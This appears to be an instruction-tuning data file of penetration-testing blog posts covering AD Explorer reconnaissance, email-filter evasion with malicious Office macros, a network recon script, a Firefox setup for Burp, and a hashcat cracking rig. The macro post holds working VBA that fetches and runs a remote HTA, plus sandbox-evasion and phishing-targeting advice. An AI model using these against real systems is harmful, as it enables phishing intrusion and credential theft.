change the status from disabled to enabled (even as DA) but at least you can check and avoid disabled accounts to stay a bit stealthier using this method.\n\nNow, about the external testing\u2026..What if you do a Shodan search for DCs that are exposed on the Internet and log on to one that way? Of course, you'll need to come up with a domain account if you want to connect to the server using AD Explorer. The search below is for two common LDAP ports and a hostname that contains the letters \u201cDC\u201d. There are plenty out there accessible from the Internet surprisingly enough.\n\nOr take it a step further and add in port 445 to find Domain Controllers that may be vulnerable to some of the freshly leaked SMB exploits from Shadow Brokers. (Note: Not all these hits have all three ports open.)\n\nA compromise of one of these servers could represent the compromise of an entire domain. Yikes. Make sure your organization is not on this list!\n\n!!New Tips and Tricks Added May 2018!!\n\nUse AD Explorer to Assist with Phishing Ruses.\n\nIf you want to send targeted phishing emails to a particular group from an external email address, you can query AD for distribution groups that allow mail from external sources.  The attribute msExchRequireAuthToSendTo reveals this. When that attribute is False, anyone can send mail to the group.\n\nYou can also double-click a group from the search results and then examine the member attribute of the group to get a list of the members.  Individual email addresses can be extracted that way but it is much more tedious. The ability to send to a group is much quicker and it just might make the email a bit more believable to the recipients.\n\nCreate a Snapshot from the Command Line\n\nAD Explorer is a GUI tool but as you know, GUI access is often not available.  But from shell access, you can create a snapshot too (Thanks Fletch!). Upload the executable to the host you have shell access on and use the following command:\n\nadexplorer.exe -snapshot \"\" mysnap.dat\n\nOr run it without uploading first with this command:\n\n\\\\live.sysinternals.com\\tools\\adexplorer.exe -snapshot \"\" snap.dat\n\nYou can see the required syntax by typing \u201cadexplorer /?\u201d from the command prompt:\n\nHunting for Privileged Accounts\n\nAlso, if you are hunting for privileged accounts to don\u2019t forget to check the Builtin Administrators group.  This may contain accounts that are not necessarily Domain Admins but might have local admin access to domain controllers FTW!\n\nHunting for Passwords\n\nThere are 3-4 fields that seem to be common in most AD schemas, UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password. On a surprising number of tests, we find one or more of these fields are populated with ACTUAL passwords. They are sometimes obfuscated by converting to the ASCII decimal equivalents but that is nothing that \u201cman ascii\u201d can\u2019t help you with.\n\nHere is an example from a recent snapshot we took.\n\nThese both have the same password, which decodes to  A B C D ! e f g h 1 2 3 4 5 $ 6 7 8 9 0.\n\nIf you know of any other tips or tricks using AD Explorer please let us know and will add them on. Thanks!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Get Malicious Macros Past Email Filters\"\nTaxonomies: \"Phishing, Red Team, Red Team Tools, macros, MS Excel, MS Office, MS Word, Risky Business\"\nCreation Date: \"Mon, 05 Jun 2017 18:41:58 +0000\"\nCarrie Roberts //      \n\nA malicious macro in a Microsoft Word or Excel document is an effective hacking technique. These documents could be delivered in a variety of ways including through an email or uploaded as a \u201cresume\u201d to a job site. For this reason, anti-malware solutions such as inbound email filters attempt to block delivery of malicious macros. In my experience, the following techniques prove useful in bypassing these protections.\n\nFirst, a standard little trick taught to me by Ethan Robish (@ethanrobish) is to save the macro-enabled document in the older \u201cWord 97-2003 Document\u201d format. More recent versions of MS Office require the \u201cdocm\u201d extension for macro-enabled documents but the older format allows for a less obvious \u201cdoc\u201d extension.\n\nSave Macro-Enabled Document as Word 97 \u201c.doc\u201d File\n\nWhile this won\u2019t be enough to get you by many of the filters, it is a good first step.\n\nBrian Fehrman (@fullmetalcache) has posted some tricks in the past on the same subject of bypassing mail filters, but this hasn\u2019t been working for me as of late. It appears that the inbound filters are disliking the methods used by PowerShell Empire, Metasploit, and even TrustedSec\u2019s Unicorn payload generator to invoke the command shell from a macro.\n\nAs an alternative, I found the following macro to successfully bypass inbound email filters. This macro reads a HTA file from a remote webDav server.\n\nSub AutoOpen()\n\n        Debugging\n\nEnd Sub\n\nSub Document_Open()\n\n        Debugging\n\nEnd Sub\n\nPublic Function Debugging() As Variant\n\n    Set shellApp = CreateObject(\"Shell.Application\")\n\n    shellApp.Open (\"\\\\your.webdavserver.net\\webdav\\updater.hta\")\n\nEnd Function\n\nThis code uses the \u201cShell.Application Open\u201d method which is less scrutinized by inbound email filters than a direct attempt to invoke a command on the command line. To use the macro, replace the \u201cyour.webdavserver.net\u201d text with the domain or IP address of your webDav server where you are hosting the HTA file. Depending on the target environment, using a domain name may be effective while using an IP address is not, or vice-versa. Try both. For information on setting up a webDav server, see this blog post.\n\nThe HTA file itself can be generated with a number of tools. An example using PowerShell Empire is given below. Save the output to a file with an \u201chta\u201d extension.\n\nGenerating HTA Payload with PowerShell\n\nIn the event that the target has little to no internet connectivity with which to download the HTA file, you may have to write the HTA file to the disk on the target. However, some email filters run the macro payload in a sandbox environment and do not like it when a macro both writes a file to disk and subsequently reads it. You can usually get away with one or the other in the macro but not both. If you have direct access to the target, test this out by manually creating your payload on the target system and then emailing a macro to simply execute the existing payload. Your macro will likely make it through the inbound email filters. This brings up some interesting ideas about having a macro which executes a file if it already exists on disk, otherwise, it creates it and exits. This would require the macro to be run twice by the victim. This is not completely infeasible. If you have the macro show an error and close the document, the victim is likely to try to open it again.\n\nThis leads us to more creative ideas, what if the macro checked the time of day and would only execute the malicious payload after a certain day and time. The time could be set for ten minutes after the email is sent. The macro, in this case, would not exhibit malicious behavior when executed in the sandbox but would behave differently later. For the record, I tried this and failed recently but it is good food for thought and may be effective against other anti-malware solutions.\n\nMy final working solution, in this case where internet connectivity was restricted, was to write the file to a specific location that existed on my target but not in the sandbox environment. For example \u201cc:\\Users\\croberts\\\u201d. Since this location does not exist in the sandbox environment, it does not get written to disk nor subsequently executed. However, on the target system, it works like a charm. The final macro is shown below.\n\nSub AutoOpen()\n\n        Bhistest\n\nEnd Sub\n\nSub Document_Open()\n\n        Bhistest\n\nEnd Sub\n\nPublic Function Bhistest() As Variant\n\nDim Str As String\n\nDim Str2 As String\n\nStr = \"\"\n\n    Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n\n    Set objFile = objFSO.CreateTextFile(\"c:\\users\\croberts\\final.hta\", True)\n\n    objFile.Write Str & vbCrLf\n\n    objFile.Write Str2\n\n    objFile.Close\n\n    Set shellApp = CreateObject(\"Shell.Application\")\n\n    shellApp.Open (\"c:\\users\\croberts\\final.hta\")\n\nEnd Function\n\nRemote code execution through an email phish has been demonstrated, even under some of the most restrictive environments.\n\nDefenders, do you REALLY need to allow macro enabled document delivery from external sources? It's risky business.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Identify Network Vulnerabilities with NetworkRecon.ps1\"\nTaxonomies: \"Author, David Fletcher, External/Internal, Red Team, Red Team Tools, network traffic, Network Vulnerabilities, NetworkRecon.ps1, tools\"\nCreation Date: \"Thu, 08 Jun 2017 15:02:19 +0000\"\nDavid Fletcher //\n \nWhenever I have the opportunity, I like to perform packet collection on a test for about five minutes so I can analyze the results and look for network-based opportunities to attack. However, on many engagements I find that I don\u2019t have the opportunity inspect network traffic. This is because I either don\u2019t want to install third-party software, doing so is prevented by a technical control, or that doing so is out of scope on the test. In this post I present NetworkRecon.ps1, a script that allows you to perform quick analysis to identify potentially vulnerable protocols visible by Windows client systems.\n\nInitially, I attempted to build a tool that would collect and analyze traffic presenting output similar to that produced by PowerUp.ps1 Invoke-AllChecks as seen below. PowerUp is used to provide very concise feedback indicating where an operating system\u2019s configuration might allow privilege escalation. The intent for this script was to do the same for network protocol abuse.\n\nIn investigating the available options, I found that working with the facilities for packet capture and analysis using PowerShell (particularly Windows 7 and older operating systems) were not optimal for creating this output in all cases.\nFortunately, I was already familiar with Invoke-Inveigh written by Kevin Robertson and included in several other exploitation frameworks. After running into issues with the collect and analyze workflow, I adopted the packet sniffing capabilities observed in this and other tools as an alternative.\nThe script includes three functions; Invoke-NeighborAnalysis, Invoke-TraceCollect, and Invoke-LiveAnalysis. These functions provide different detective capabilities to identify CDP, DTP, VTP, LLDP, mDNS, NBNS, LLMNR, HSRP, OSPF, and VRRP protocols which may be used for information gathering or indicate vulnerability to attack. In addition, the script analyzes DHCP responses looking for options that indicate network boot is supported. \nInvoke-NeighborCacheAnalysis:\nInvoke-NeighborAnalysis attempts to detect the presence of the protocols listed above at layer 2 of the OSI model. This function uses the output from either \u201carp -a\u201d or Get-NetNeighbor based on the supported PowerShell version. The output is analyzed looking for corresponding multicast layer 2 and layer 3 addresses indicating that a protocol is likely in use and visible from the end host. The packet sniffer uses a raw socket and doesn\u2019t collect Ethernet frames. As a result, this is the only way that CDP, DTP, VTP, and LLDP can be detected at present. I did some research on collecting Ethernet frames using PowerShell but came up empty handed. Output from Invoke-NeighborCacheAnalysis can be seen below.\n\nInvoke-TraceCollect\nInvoke-TraceCollect does exactly what it sounds like. It simply records network traffic in a trace file for a user specified period (default is 5 minutes) so the user can move the traffic off and analyze it with another tool.  This function will output either a \u201c.cap\u201d file or a \u201c.etl\u201d file depending on the operating system features. Windows 8.1 and newer supports the Protocol Engineering Framework (PEF) PowerShell commandlets by default.  This framework allows one to directly save a network trace in packet capture format. Older versions of Windows support the Event Trace Log (ETL) format which records packets in an XML and binary format. ETL format can be converted to packet capture as well. However, Microsoft Message Analyzer (an additional Microsoft software package) is used to do so. The output from this function simply indicates which format is being used and where the trace file is being written. To run this function, you must have administrator permissions on the target computer.\n\nInvoke-LiveAnalysis\nInvoke-LiveAnalysis uses a raw IP socket to pick traffic up off of the wire and perform analysis. This method uses the layer 3 multicast addresses and well known ports to identify the presence of protocols of interest.  The user is notified when mDNS, NBNS, LLMNR, HSRP, OSPF, or VRRP packets are observed. Notifications include details parsed from observed traffic such as authentication method, passwords or hashes used, and hostnames for which queries are observed.  Output from several of the protocols above can be seen in the screen captures below.\n\nThe protocols listed above were selected due to the presence of attacks and tools available for each. Protocols and their related vulnerabilities are identified below.\n\nCDP and LLDP may expose information valuable to an attacker such as Layer 2 device names and firmware revisions.\nDTP and VTP may allow an attacker to access protected areas of the network through VLAN hopping attacks.\nmDNS, NBNS, and LLMNR may allow an attacker to send poisoned responses to multicast name resolution request. These attacks, executed by tools like Invoke-Inveigh and Responder, can result in credential compromise or direct exploitation by directing requesting hosts to an attacker controlled computer.\nHSRP and VRRP may allow an attacker to become a Man-in-the-Middle (MitM) by electing an attacking computer as the active router in a redundant configuration.\nOSPF may allow an attacker to become a MitM by manipulating the OSPF routing table.\nDiscovery of DHCP boot options may allow an attacker to boot an authorized operating system or download and analyze the boot image for valid credentials.\n\nThe end goal for this tool is to include intelligence gathering and attack capabilities for all of the Layer 3 protocols identified above.  Further investigation into Layer 2 protocols will continue to determine whether Layer 2 attacks will be possible using the native PowerShell interface.\nYou can find the full script at https://bitbucket.org/Super68/networkrecon/ and an expanded explanation of each of the functions at https://www.sans.org/reading-room/whitepapers/access/identifying-vulnerable-network-protocols-powershell-37722 .\nPlease provide feedback and let us know how this tool works in practice!!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Towards a Quieter Firefox\"\nTaxonomies: \"Author, Brian King, General InfoSec Tips & Tricks, InfoSec 201, Firefox, Firefox extentions, HTTP, penetreation testing, Pentesting, quieter Firefox, tool, webapp test\"\nCreation Date: \"Mon, 12 Jun 2017 14:24:06 +0000\"\nBrian King //\n\nOn a recent webapp test, I got a little frustrated with all the extra HTTP requests showing up in my Burpsuite Proxy History from connections that Firefox was making on its own. I was having to scroll around way more than I used to while trying to make sense of the traffic. The last straw was this \u201cdetectportal\u201d thing that seemed to be showing up every 60 seconds.\nI found some other Firefox users complaining about the same things, and I followed those steps, but they didn\u2019t cover everything. I\u2019m going to show you what I learned about keeping Firefox quieter, and I\u2019ll give you a file you can use yourself to take care of all this stuff automatically when you set up a new installation.\nI set up a fresh install of Firefox version 53.0 with no plugins or add-ons, and told it to connect through Burp Suite. I added the Burp CA certificate so Firefox wouldn\u2019t complain about the certificates Burp would generate, and so I could still connect to the sites using HSTS.\nAfter ten minutes of just letting the browser sit there, I\u2019d captured 52 HTTP requests to 12 unique domains.\n\nTen Minutes, No User Action, Twelve Domains\n\nTen Minutes, 52 Requests\nThe first (and last) request was the one that got my attention and started me down this road. By default, Firefox sends an HTTP GET to http://detectportal.firefox.com/success.txt every 60 seconds. And the response is just the word \u201csuccess\u201d - what\u2019s it doing? According to https://bugzilla.mozilla.org/show_bug.cgi?id=1307867, this is a way for Firefox to detect if it\u2019s running behind a captive portal. A captive portal is that sign-in page you get at hotels and airports when you try to browse the Internet, where you have to log in or agree to terms or some such.\nThere\u2019s an \u201cadvanced\u201d setting that can disable this, but nothing exposed in the UI. In the address bar, type \u201cabout:config\u201d then click through the warning.\nSearch for network.captive-portal-service.enabled and click it to toggle to \u201cfalse,\u201d and it\u2019ll stop sending this request.\n\nThat takes care of this one case, but while we\u2019re at it, let\u2019s see how far we can go. The Firefox project has a list to help you out, under the heading, How to stop Firefox from making automatic connections \u201chttps://support.mozilla.org/en-US/kb/how-stop-firefox-making-automatic-connections\u201d\nThat article is a little old, and some things are not where they were when it was written, so let\u2019s start with the UI as it is in version 53.0 of Firefox, which is the current version as of this writing.\nBefore we begin, you need to know that the button at the top right of the browser window, just below the title bar, with three horizontal lines across it is called the \u201chamburger menu\u201d by the same people who want you to believe that the floppy disk icon is an unrecognizable symbol for the \u201csave\u201d function. When I say \u201chamburger\u201d below, that\u2019s what I\u2019m talking about.\n\nHamburger > Options > General: When Firefox Starts: \u201cShow a blank page\u201d\nSearch: uncheck \u201cprovide search suggestions\u201d for whichever search engine you choose.\nContent: (no changes)\nApplications: (no changes)\nPrivacy: uncheck \u201cUse Tracking Protection in Private Windows\u201d (because this feature requires Firefox to keep its list of tracking methods updated)\nSecurity: uncheck \u201cBlock dangerous and deceptive content\u201d (because Firefox has to keep its list of these things updated, too)\nSecurity: uncheck \u201cBlock dangerous downloads\u201d\nSecurity: uncheck \u201cWarn you about unwanted and uncommon software\u201d\nSync: Don\u2019t sign into a Firefox account here.\nAdvanced > General: (no changes)\nAdvanced > Data Choices: uncheck everything on this pane.\nAdvanced > Network: (no changes)\nAdvanced > Update: check \u201cNever check for updates\u201d\nAdvanced > Update: uncheck \u201cUse a background service to install updates\u201d and \u201cautomatically update search engines\u201d\nCertificates: (no changes)\n\nHamburger > Add-ons > Gear Menu at the top: uncheck \u201cUpdate Add-ons Automatically\u201d\n\nWith the captive portal Preference set to false, and those UI-accessible changes made, close Firefox and restart it.\nIt\u2019s better, but there are still some connections happening at startup:\n\nThese are far less problematic than the captive portal thing, but in the interest of making Firefox as quiet as possible, let\u2019s figure out how to make these stop, too.\nGo to about:config, and search for the string \u201cself-repair.mozilla.org\u201d and you\u2019ll find this:\n\nThat\u2019s the same hostname, but not the same URL. This turns out to be related to the \u201cHeartbeat\u201d user-survey function, as explained at https://wiki.mozilla.org/Advocacy/heartbeat, and doesn\u2019t actually repair anything.\nDelete the \u201cvalue\u201d for this preference (double-click the row, then just blank out the value). Then restart Firefox again. You should notice that those three requests don\u2019t happen anymore. It\u2019s actually pretty quiet!\nI let the browser sit open again for ten minutes on the default blank tab, and there were no HTTP requests from Firefox this time.\nThere are still some connections that will happen automatically during a browsing session, just less often. If you want to catch these too, go to about:config and set all of the items below to \u201cfalse\u201d:\n\nextensions.blocklist.enabled\nnetwork.prefetch-next\nextensions.getAddons.cache.enabled\nbrowser.casting.enabled\n\nAnd set this to \u201ctrue\u201d:\n\nnetwork.dns.disablePrefetch\n\nAnd set this to zero:\n\nNetwork.http.speculative-parallel-limit\n\nAnd set this to the empty string:\n\nbrowser.aboutHomeSnippets.updateUrl\n\nAnd set these to the word \u201cignore\u201d:\n\nbrowser.startup.homepage_override.mstone\n\nThere. Now Firefox shouldn\u2019t be polluting your Burp Proxy History with requests you didn\u2019t make.\nI put this all into a user.js file, which you can copy to the Firefox profile directory every time you set up a new testing VM, so you don\u2019t have to remember and make all those changes by hand.\nRemember, the only point here is to make Firefox quiet. This isn\u2019t a \u201csecurity\u201d thing, and would actually be a pretty bad idea to install on the Firefox you use for daily browsing.\nGet a copy of the file here: https://bitbucket.org/mrbbking/quieter-firefox and if you have ideas for improvement, the repo is there as well.\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Build a Password Cracker with NVidia GTX 1080TI & GTX 1070\"\nTaxonomies: \"Author, Kent Ickler, Red Team, Red Team Tools, Build, Hash, Hashcat, Hashcat Benchmarks, Kent Ickler, Nvidia GTX 1070, password, Password Cracker, Password cracking, Summer2017, The Kraken\"\nCreation Date: \"Tue, 20 Jun 2017 15:17:15 +0000\"\nKent Ickler //\n\nThe Task\n\nUpdate our in-house password cracking/hashing capabilities\n\nPurchase a new cracking machine\n\nUpdate the old cracking system\n\nStay within budget\n\nBuy The Things:\n\nASUS X99-E WS/USB 3.1 LGA 2011-v3 Intel X99 SATA 6Gb/s USB 3.1 USB 3.0 CEB Intel MotherboardQTY 1: $515https://www.newegg.com/Product/Product.aspx?Item=N82E16813182968\n\nEVGA GeForce GTX 1080 Ti FE DirectX 12 11G-P4-6390-KRQTY 4 @ $700 ~$2800https://www.newegg.com/Product/Product.aspx?Item=N82E16814487335\n\nIntel Core i7-6800K Broadwell-E 6-Core 3.4 GHz LGA 2011-v3 140W BX80671I76800K Desktop ProcessorQTY 1: $440https://www.newegg.com/Product/Product.aspx?Item=N82E16819117649\n\nG.SKILL TridentZ Series 64GB (4 x 16GB) 288-Pin DDR4 SDRAM DDR4 3200 (PC4 25600) Intel X99 Platform Desktop Memory Model F4-3200C16Q-64GTZKOQTY 1: $509https://www.newegg.com/Product/Product.aspx?Item=N82E16820232331\n\nMasterAir Pro 4 CPU Air Cooler with Continuous Direct Contact Technology 2.0 by Cooler MasterQTY 1: $46 **https://www.newegg.com/Product/Product.aspx?Item=N82E16835103229\n\nAthena Power RM-4U8G525 Black SGCC (T=1.2mm) 4U Rackmount Server Case 2 External 5.25\" Drive Bays - OEMQTY 1: $250https://www.newegg.com/Product/Product.aspx?Item=N82E16811192442\n\nRosewill 1600W Modular Gaming Power Supply, Continuous @ 50 Degree C, 80 PLUS GOLD Certified, SLI & CrossFire Ready - HERCULES-1600SQTY 1: $350https://www.newegg.com/Product/Product.aspx?Item=N82E16817182251\n\nSAMSUNG 850 EVO 2.5\" 500GB SATA III 3-D Vertical Internal Solid State Drive (SSD) MZ-75E500B/AMQTY 1: $200 **https://www.newegg.com/Product/Product.aspx?Item=N82E16820147373\n\nTotal for new password cracking machine$5110\n\nA Few Quick Lessons\n\nThe CPU cooler doesn\u2019t actually clear the case cover. This was OK because we don\u2019t want to suffocate the GPU\u2019s and I hadn\u2019t planned on placing the cover on the unit anyway.  The case was specifically chosen as it was rack-mount with enough room for the motherboard to fit and properly support the four dual slot GPUs. A CPU cooler more fitting might be something like this: https://www.newegg.com/Product/Product.aspx?Item=9SIA1K65BT9403\n\nThe motherboard selected was chosen in part for its support on the M.2 SSD support. Unfortunately, it doesn't support SATA M.2, which was what I had mistakenly purchased. It does support PCIE M.2 for those looking. In the build list above, you will note I have replaced the data storage with a Samsung 500GB SSD. You\u2019ll also notice in the photos that I have temporarily used a PNY SSD that we had \u201claying around\u201d.\n\nThe Build\n\nPiecing the equipment together is pretty straight forward. The most complicated part was mounting the CPU cooler/fan. The cooler supports multiple CPU formats and consequently comes with multiple mounts that must be manipulated in such a way to work with the LGA 2011-v3 socket.\n\nMotherboard\n\nInstalling Motherboard in case  Note M.2 SATA installed (see above)\n\nCPU & CPU Fan fitment, note does not clear case top.\n\nAdd Power Supply and Ram\n\nGPU\u2019s to install\n\nGPU Installed, ready to be cabled\n\nGPU\u2019s cabled and readied.  Note PNY SSD (see above)\n\nThe Software\n\nNvidia and Linux are happy together!\n\nUbuntu 16.04 LTS server distro with full disk encryption \n\nNvidia drivers directly from the Nvidia website \n\nHashcat 3.5 \n\nThis took about 15-30 minutes. The Nvidia driver's worked great on Ubuntu 16.04 and I didn't have any driver-headaches getting Hashcat to run.\n\nThe Older Brother\n\nUpdating an older cracking-machine\n\n We were under budget and used the excess funds to buy GPU\u2019s to replace our old password cracking machine\u2019s water-cooled AMD 290x\u2019s. We chose to replace those 4 GPUs with Nvidia GTX 1070 Founders Edition.\n\nEVGA GeForce GTX 1070 08G-P4-6170-RX Founders Edition, 8GB GDDR5, LED, DX12 OSD Support (PXOC) Graphics CardQTY4 @$400 ~ $1600https://www.newegg.com/Product/Product.aspx?Item=N82E16814487326\n\nThe Benchmark Numbers\n\nThe result of this project was a new password cracking machine capable of over 208GH/sec NTLM and a refurbished machine capable of an other 119 GH/sec NTLM.\n\nCombined, our password cracking/hashing capability just topped 327GH/sec for NTLM hashes. That's 327,000,000,000 password attempts per second.Not bad if comparing our investment to the $21,000 Brutalis that has been seeing 334 GH/sec.\n\nThe Benchmark Previews\n\nDuring the design and product selection, I was a bit annoyed by the lack of public benchmarks for the GTX 1080TI and GTX 1070 cards. Our next post will be exclusively listing our benchmarks from our two most powerful cracking rigs.\n\nFull Benchmarks on the second part of this blog post!\n\nOpenCL Platform #1: NVIDIA Corporation\n======================================\n* Device #1: GeForce GTX 1080 Ti, 2793/11172 MB allocatable, 28MCU\n* Device #2: GeForce GTX 1080 Ti, 2793/11172 MB allocatable, 28MCU\n* Device #3: GeForce GTX 1080 Ti, 2793/11172 MB allocatable, 28MCU\n* Device #4: GeForce GTX 1080 Ti, 2792/11169 MB allocatable, 28MCU\n\nHashtype: MD4\n\nSpeed.Dev.#1.....: 53850.2 MH/s (69.76ms)\nSpeed.Dev.#2.....: 54047.7 MH/s (69.51ms)\nSpeed.Dev.#3.....: 52955.5 MH/s (70.94ms)\nSpeed.Dev.#4.....: 53750.1 MH/s (69.86ms)\nSpeed.Dev.#*.....:   214.6 GH/s\n\nHashtype: MD5\n\nSpeed.Dev.#1.....: 31103.4 MH/s (60.39ms)\nSpeed.Dev.#2.....: 31676.5 MH/s (59.26ms)\nSpeed.Dev.#3.....: 30600.9 MH/s (61.33ms)\nSpeed.Dev.#4.....: 31198.4 MH/s (60.20ms)\nSpeed.Dev.#*.....:   124.6 GH/s\n\nOpenCL Platform #1: NVIDIA Corporation\n======================================\n* Device #1: GeForce GTX 1070, 2028/8112 MB allocatable, 15MCU\n* Device #2: GeForce GTX 1070, 2028/8114 MB allocatable, 15MCU\n* Device #3: GeForce GTX 1070, 2028/8114 MB allocatable, 15MCU\n* Device #4: GeForce GTX 1070, 2028/8114 MB allocatable, 15MCU\n\nHashtype: MD4\n\nSpeed.Dev.#1.....: 33622.2 MH/s (59.85ms)\nSpeed.Dev.#2.....: 32953.6 MH/s (61.07ms)\nSpeed.Dev.#3.....: 33108.6 MH/s (60.78ms)\nSpeed.Dev.#4.....: 34089.1 MH/s (59.02ms)\nSpeed.Dev.#*.....:   133.8 GH/s\n\nHashtype: MD5\n\nSpeed.Dev.#1.....: 18534.9 MH/s (54.28ms)\nSpeed.Dev.#2.....: 17880.8 MH/s (55.68ms)\nSpeed.Dev.#3.....: 18188.7 MH/s (55.32ms)\nSpeed.Dev.#4.....: 18401.1 MH/s (54.66ms)\nSpeed.Dev.#*.....: 73005.5 MH/s\n\nTop: Nvidia 1080TIs password cracker\n\nBottom: Nvidia GTX 1070 password cracker\n\nThe Links\n\nHashcat: https://hashcat.net/\n\nNVidia Drivers: http://www.nvidia.com/Download/index.aspx\n\nUbuntu 16.04: https://www.ubuntu.com/download/server\n\nBenchmarks: Here!\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Hashcat Benchmarks for Nvidia GTX 1080TI & GTX 1070 Hashcat Benchmarks\"\nTaxonomies: \"Author, How-To, Kent Ickler, Benchmarks, Hashcat Benchmarks, Kent Ickler, Nvidia GTX, Password Cracker, The Kraken\"\nCreation Date: \"Tue, 20 Jun 2017 15:24:02 +0000\"\nKent Ickler //\n\nIn my last post, I was building a password cracking rig and updating an older rig with new GPU cards. I struggled during the design process to find a reliable source of information regarding accurate Hashcat benchmarks. As promised I am posting unaltered benchmarks of our default configuration benchmarks. Nothing was done to these GPU cards to overclock them or otherwise alter their factory-delivered abilities.\n\nFor more information, check out our build blog post here.\n\nSystem 1: 4x Nvidia GTX 1080 TI\n\nSystem 2: 4x Nvidia GTX 1070 (scroll down a bit)\n\n_____\n\nSystem 1: 4x Nvidia GTX 1080 TI\n\nMB: Asus X99-E WS USB3.1  \n\nCPU: Intel i7-6800K Broadwell-E 6-core 3.4GHZ \n\nRAM: G.Skill Tridendz 64GB (4x16) DDR4 3200 \n\nPSU: Rosewell Hercules 1600w 80 Plus Gold  \n\nHDD: SATA SSD 500GB\n\nOS: Ubuntu 16.04\n\nCASE: Athena Power-RM-4U8G525 \n\nPackages: Hashcat 3.5\n\nGPU: 4x EVGA GeForce GTX 1080 Ti FE\n\nhashcat (v3.5.0) starting in benchmark mode...\n\nOpenCL Platform #1: NVIDIA Corporation\n======================================\n* Device #1: GeForce GTX 1080 Ti, 2793/11172 MB allocatable, 28MCU\n* Device #2: GeForce GTX 1080 Ti, 2793/11172 MB allocatable, 28MCU\n* Device #3: GeForce GTX 1080 Ti, 2793/11172 MB allocatable, 28MCU\n* Device #4: GeForce GTX 1080 Ti, 2792/11169 MB allocatable, 28MCU\n\nHashtype: MD4\n\nSpeed.Dev.#1.....: 53850.2 MH/s (69.76ms)\nSpeed.Dev.#2.....: 54047.7 MH/s (69.51ms)\nSpeed.Dev.#3.....: 52955.5 MH/s (70.94ms)\nSpeed.Dev.#4.....: 53750.1 MH/s (69.86ms)\nSpeed.Dev.#*.....:   214.6 GH/s\n\nHashtype: MD5\n\nSpeed.Dev.#1.....: 31103.4 MH/s (60.39ms)\nSpeed.Dev.#2.....: 31676.5 MH/s (59.26ms)\nSpeed.Dev.#3.....: 30600.9 MH/s (61.33ms)\nSpeed.Dev.#4.....: 31198.4 MH/s (60.20ms)\nSpeed.Dev.#*.....:   124.6 GH/s\n\nHashtype: Half MD5\n\nSpeed.Dev.#1.....: 20587.6 MH/s (91.24ms)\nSpeed.Dev.#2.....: 20866.0 MH/s (90.01ms)\nSpeed.Dev.#3.....: 19467.0 MH/s (92.36ms)\nSpeed.Dev.#4.....: 20646.6 MH/s (90.98ms)\nSpeed.Dev.#*.....: 81567.2 MH/s\n\nHashtype: SHA1\n\nSpeed.Dev.#1.....: 11374.1 MH/s (82.58ms)\nSpeed.Dev.#2.....: 11535.0 MH/s (81.42ms)\nSpeed.Dev.#3.....: 11213.9 MH/s (83.76ms)\nSpeed.Dev.#4.....: 11431.3 MH/s (82.16ms)\nSpeed.Dev.#*.....: 45554.3 MH/s\n\nHashtype: SHA-256\n\nSpeed.Dev.#1.....:  4426.4 MH/s (52.83ms)\nSpeed.Dev.#2.....:  4476.3 MH/s (52.22ms)\nSpeed.Dev.#3.....:  4358.1 MH/s (53.66ms)\nSpeed.Dev.#4.....:  4443.6 MH/s (52.63ms)\nSpeed.Dev.#*.....: 17704.4 MH/s\n\nHashtype: SHA-384\n\nSpeed.Dev.#1.....:  1394.9 MH/s (84.17ms)\nSpeed.Dev.#2.....:  1401.7 MH/s (83.74ms)\nSpeed.Dev.#3.....:  1371.3 MH/s (85.62ms)\nSpeed.Dev.#4.....:  1379.4 MH/s (85.09ms)\nSpeed.Dev.#*.....:  5547.2 MH/s\n\nHashtype: SHA-512\n\nSpeed.Dev.#1.....:  1511.9 MH/s (77.65ms)\nSpeed.Dev.#2.....:  1524.0 MH/s (77.04ms)\nSpeed.Dev.#3.....:  1487.6 MH/s (78.90ms)\nSpeed.Dev.#4.....:  1504.3 MH/s (78.05ms)\nSpeed.Dev.#*.....:  6027.8 MH/s\n\nHashtype: SHA-3 (Keccak)\n\nSpeed.Dev.#1.....:  1173.9 MH/s (99.91ms)\nSpeed.Dev.#2.....:  1207.5 MH/s (48.56ms)\nSpeed.Dev.#3.....:  1188.6 MH/s (49.32ms)\nSpeed.Dev.#4.....:  1180.1 MH/s (49.67ms)\nSpeed.Dev.#*.....:  4750.1 MH/s\n\nHashtype: SipHash\n\nSpeed.Dev.#1.....: 40491.1 MH/s (92.78ms)\nSpeed.Dev.#2.....: 40353.2 MH/s (93.10ms)\nSpeed.Dev.#3.....: 39807.4 MH/s (94.38ms)\nSpeed.Dev.#4.....: 40041.5 MH/s (93.83ms)\nSpeed.Dev.#*.....:   160.7 GH/s\n\nHashtype: Skip32 (PT = $salt, key = $pass)\n\nSpeed.Dev.#1.....:  5858.0 MH/s (1.39ms)\nSpeed.Dev.#2.....:  5924.2 MH/s (1.37ms)\nSpeed.Dev.#3.....:  5853.9 MH/s (1.41ms)\nSpeed.Dev.#4.....:  5970.5 MH/s (1.38ms)\nSpeed.Dev.#*.....: 23606.5 MH/s\n\nHashtype: RIPEMD-160\n\nSpeed.Dev.#1.....:  6753.6 MH/s (69.53ms)\nSpeed.Dev.#2.....:  6858.1 MH/s (68.45ms)\nSpeed.Dev.#3.....:  6630.3 MH/s (70.80ms)\nSpeed.Dev.#4.....:  6739.4 MH/s (69.68ms)\nSpeed.Dev.#*.....: 26981.4 MH/s\n\nHashtype: Whirlpool\n\nSpeed.Dev.#1.....:   357.9 MH/s (163.86ms)\nSpeed.Dev.#2.....:   362.7 MH/s (161.71ms)\nSpeed.Dev.#3.....:   350.4 MH/s (167.39ms)\nSpeed.Dev.#4.....:   357.7 MH/s (163.97ms)\nSpeed.Dev.#*.....:  1428.7 MH/s\n\nHashtype: GOST R 34.11-94\n\nSpeed.Dev.#1.....:   335.7 MH/s (87.44ms)\nSpeed.Dev.#2.....:   340.5 MH/s (86.18ms)\nSpeed.Dev.#3.....:   328.5 MH/s (89.36ms)\nSpeed.Dev.#4.....:   335.3 MH/s (87.55ms)\nSpeed.Dev.#*.....:  1339.9 MH/s\n\nHashtype: GOST R 34.11-2012 (Streebog) 256-bit\n\nSpeed.Dev.#1.....: 70838.3 kH/s (204.78ms)\nSpeed.Dev.#2.....: 71370.8 kH/s (203.24ms)\nSpeed.Dev.#3.....: 68980.4 kH/s 